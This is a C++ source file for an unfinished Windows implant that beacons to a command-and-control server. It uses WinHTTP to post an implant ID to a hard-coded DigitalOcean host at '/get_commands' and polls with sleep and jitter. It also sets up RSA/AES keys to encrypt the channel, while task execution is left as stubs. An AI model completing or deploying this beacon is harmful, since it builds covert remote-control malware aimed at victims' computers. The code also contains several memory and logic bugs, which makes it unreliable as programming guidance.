/**post request, try initial communcation with c2, when working->
every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <windows.h>
#include <winhttp.h>
#include <future> 
#define SERVERNAME "placeholder"
#define SLEEP 60000
#define serverpublickey "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzx4uIFIDB0pWvgR/JxYiS1CFOgxV4zWWprRE/Te48cZSC49SHXAya/gKIHO66/7I1yFNiuLhcqtuDx2Pt1fSK1Hw2neXkFRnbGDJXLkGldGe+7Uqjw1XrTT24QXRjAFE/jmVm3FtvrsHloSQZO5mvrHOzHsd+AH4i/HK3rDQ7U6vgQfroPpShD2mK6HPYsQxHTTiz+SMGD3VpG49aUk7YLxR2pfVA/x7vo7MLXDwYI2znwMcu0C5MweN4f7x7C0aop6qFQZVef1/2TbdeSEdri6oWAkwFWA8PCiQaIXvrnjOgm4zMDtFE3CHbcl335ArDQoeCPdeFjIIubGOlUfmAFHJ7Xntb/q2mgDz3VZ9ox7Jzd/ZktrODVyO8VTL3Wt4nQx48fSNU8bWfrTlrKmXwA/2+mvhNjFBRF6R5a7JztsrZkQ1Y1FbMstkw1+Q80mLsLowAfE2VerKjCd7484XXpDtvEdaPkPiYgfRTotrhkkpkcKlLCvdArbNxDnkv328= sumthing"


size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
{
    data->append((char *)ptr, size * nmemb);
    return size * nmemb;
}

void tasks()
{
    while (1)
    {
        Sleep(SLEEP);
    }
}



BCRYPT_KEY_HANDLE importrsakey(PUCHAR pbinnput,ULONG pbinputsize){
    BCRYPT_ALG_HANDLE rsahandle;
    BCryptOpenAlgorithmProvider(&rsahandle,BCRYPT_RSA_ALGORITHM,NULL,0);
    BCRYPT_KEY_HANDLE outro=new BCRYPT_KEY_HANDLE;
    BCryptImportKeyPair(rsahandle,NULL,BCRYPT_RSAPUBLIC_BLOB,&outro,pbinnput,pbinputsize,BCRYPT_NO_KEY_VALIDATION);
    return outro;
}
PUCHAR rsaEncrypt(BCRYPT_KEY_HANDLE rsakeyhandle,PUCHAR symkey, ULONG symkeysize){ 
    //Function adapted from https://stackoverflow.com/questions/58419870/how-to-use-bcrypt-for-rsa-asymmetric-encryption
    ULONG encbuffersize;
    NTSTATUS status = BCryptEncrypt(rsakeyhandle,
    symkey,
    symkeysize,
    NULL,
    NULL,
    0,
    NULL,
    0,
    &encbuffersize,
    0);
    PUCHAR encbuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, encbuffersize);
    if (encbuffer == NULL) {
        printf("failed to allocate memory for blindedFEKBuffer\n");
    }
    BCryptEncrypt(rsakeyhandle,symkey,symkeysize,NULL,NULL,0,encbuffer,encbuffersize,&encbuffersize,0);
    return encbuffer;
}
char* getsecret(){
    char* secret=(char*)malloc(8);
    std::string alphabet="abcdefghijklmonpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    unsigned int ms =std::time(nullptr);
    double mod=61;
    srand(ms);
    for(int i=0;i<8;i++){
        if(i==4){
            srand(ms+1);
        }
        int randomvalue=std::fmod(rand(),mod);
        secret[i]=alphabet[randomvalue];
    }
    return secret;
}

 BCRYPT_KEY_HANDLE newsymkey(BCRYPT_KEY_HANDLE rsakey){
    BCRYPT_ALG_HANDLE ahandle;
    BCRYPT_KEY_HANDLE symkeyhandle = new BCRYPT_KEY_HANDLE;
    ULONG symkeypropertylen;
    ULONG bytescopied;
    BCryptOpenAlgorithmProvider(&ahandle,BCRYPT_AES_GMAC_ALGORITHM,NULL,0);
    
    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,NULL,0,&symkeypropertylen,0);
    PUCHAR symkeylen=(PUCHAR)malloc(symkeypropertylen);
    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,symkeylen,symkeypropertylen,&bytescopied,0);
    PUCHAR symkey=(PUCHAR)malloc((int)symkeylen);  
    
    /*
    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,NULL,0,&symkeypropertylen,0);
    PUCHAR symkeyobjlen=(PUCHAR)malloc(symkeypropertylen);
    BCryptGetProperty(ahandle,BCRYPT_OBJECT_LENGTH,symkeyobjlen,symkeypropertylen,&bytescopied,0);
    PUCHAR symkeyobj=(PUCHAR)malloc((int)symkeyobjlen);
    */
    char* secret=getsecret();
    BCryptGenerateSymmetricKey(ahandle,&symkeyhandle,NULL,0,(PUCHAR)secret,8,0);
    //BCryptGenerateSymmetricKey(ahandle,&symkeyhandle,symkeyobj,(ULONG)symkeyobjlen,(PUCHAR)secret,8,0);
    free(&symkeypropertylen);
    free(symkeylen);
    return symkeyhandle;
    }



LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if(httpsession!=NULL){
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"GET",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    NULL,
                    0,
                    0,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if(response==true)
                    {
                        DWORD bytesneeded;
                        BOOL query= WinHttpQueryDataAvailable(
                        request,
                        &bytesneeded);
                        LPSTR returnbuffer=new char[bytesneeded+1];
                        if(query==TRUE){
                            if(returnbuffer){
                                ZeroMemory(returnbuffer, bytesneeded+1);
                                BOOL dataread=WinHttpReadData(
                                request,
                                returnbuffer,
                                bytesneeded+1,
                                NULL);
                                if(dataread==TRUE){
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}





//TODO
// auto parseTasks(auto toParse){

// return 1;
// }

//TODO
// auto executeTasks(auto tasks){
    
//     return 1;
// }


LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
{
    DWORD datalen = strlen(postdata);
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (httpsession != NULL)
    {
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"POST",
                subdirectory,
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {   
                /*
                THIS IS A TESTING METHOD IMPLEMENTING FOR US TO GET HEADER*/
                
                if(WinHttpAddRequestHeaders(request, L"\"Content-Type\": \"application/json\"", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)){
                    printf("YOU SET HEADER");
                }

                /*END OF TEST*/
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    (LPVOID)postdata,
                    datalen,
                    datalen,
                    0);
                if (idrequest == TRUE)
                {
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if (response == true)
                    {
                        DWORD bytesneeded;
                        BOOL query = WinHttpQueryDataAvailable(
                            request,
                            &bytesneeded);
                        LPSTR returnbuffer = new char[bytesneeded + 1];
                        if (query == TRUE)
                        {
                            if (returnbuffer)
                            {
                                ZeroMemory(returnbuffer, bytesneeded + 1);
                                BOOL dataread = WinHttpReadData(
                                    request,
                                    returnbuffer,
                                    bytesneeded + 1,
                                    NULL);
                                if (dataread == TRUE)
                                {
                                    return returnbuffer;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

char* getData(){
    int num = 1;
    char* results;
    sprintf(results,"\{\"id\": %d \}",num);

    return results;
}
//TODO
LPSTR getTasks(void){
    std::string fqdn = "walrus-app-tj8x9.ondigitalocean.app";
    std::wstring fqdn_wstring(fqdn.begin(), fqdn.end());
    LPCWSTR servername = fqdn_wstring.c_str();

    std::string fqdn2 = "/get_commands";
    std::wstring fqdn_wstring2(fqdn2.begin(), fqdn2.end());
    LPCWSTR subdirectory = fqdn_wstring2.c_str();

    const char* postdata = getData();
    // const char* postdata = getData();
    LPSTR item = makePostRequest(servername, subdirectory, postdata);

    return item;
}
void runLoop(bool isRunning){
    BCRYPT_KEY_HANDLE rsakey=importrsakey((PUCHAR)*serverpublickey,(ULONG)562);
    newsymkey(rsakey);
    while (isRunning) {
        try {

            LPSTR getting = getTasks();
            //const auto serverResponse = std::async(std::launch::async, getTasks);
            //auto parsedTasks = parseTasks(serverResponse.get());
            //auto success = executeTasks(parsedTasks);
        }
        catch (const std::exception& e) {
            printf("\nError in runLoop: %s\n", e.what());
        }

        //SET SLEEP HERE 
    }

}

int sendresults()
{
    while (1)
    {
        //create jitter from 0 to 5 mins 
        int jitter;
        jitter=rand()*10; 
        Sleep(SLEEP+jitter);
        // Send results, check response
        // If good response break
    }
}

// Random Implant ID in hex using rand()
// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
char *random_id()
{
    char random_hex[32 + 1];
    char *random_hexptr = random_hex;

    srand(time(0));
    for (int i = 0; i < 32; i++)
    {
        sprintf(random_hex + i, "%x", rand() % 32);
    }

    return random_hexptr;
}

char *make_base_payload(char *implant_id)
{
    char payload[51] = "{\"implant_id\": }";
    char *payloadptr = payload;
    strcat(payload, implant_id);
    return payloadptr;
}

int main(int argc, char *argv[])
{
    runLoop(true);
    return 0;
}
